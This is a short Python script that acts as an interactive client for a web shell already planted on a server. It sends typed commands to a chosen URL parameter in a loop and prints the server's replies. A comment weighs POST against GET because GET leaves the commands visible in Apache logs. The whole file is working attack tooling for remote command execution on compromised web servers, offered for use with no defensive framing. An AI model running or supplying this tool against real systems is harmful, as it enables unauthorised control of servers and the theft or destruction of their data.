#! /usr/bin/python3

import requests
import argparse
import sys


parser = argparse.ArgumentParser('get a webshell with url, and use <param> as command post param (by default cmd)')
parser.add_argument('--header', action='append')
parser.add_argument('--cmd', default='cmd')
parser.add_argument('url')

args = parser.parse_args()

url = args.url
cmd = args.cmd


s = requests.Session()

headers = {}

if args.header:
	for header in args.header:
		
		key = header.split(':')[0]
		value = header[header.index(': ')+2:]
		headers[key] = value

while True:
    c = input('--> ')
    r = s.post(url, data={cmd: c}, headers=headers)
    # use this in place of post if you can't make post requests (commands are displayeds in apache logs)
    #r = s.get(url, params={cmd: c})
    print(r.request.url)
    t = r.text
    print(t)


